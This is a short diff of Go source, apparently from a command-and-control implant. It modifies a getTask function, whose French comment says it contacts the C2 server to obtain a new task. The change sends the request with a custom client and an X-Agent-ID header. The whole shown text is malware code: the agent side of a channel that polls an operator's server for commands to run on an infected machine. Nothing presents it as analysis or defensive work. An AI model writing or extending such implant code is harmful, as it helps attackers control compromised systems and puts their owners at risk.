@@ -54,7 +54,14 @@ func main() {
 
 // getTask contacte le C2 pour obtenir une nouvelle tâche.
 func getTask() (*Task, error) {
-	resp, err := http.Get(C2_URL)
+	client := &http.Client{}
+	req, err := http.NewRequest("GET", C2_URL, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Set("X-Agent-ID", AgentID)
+	resp, err := client.Do(req)
 	if err != nil {
 		return nil, err
 	}
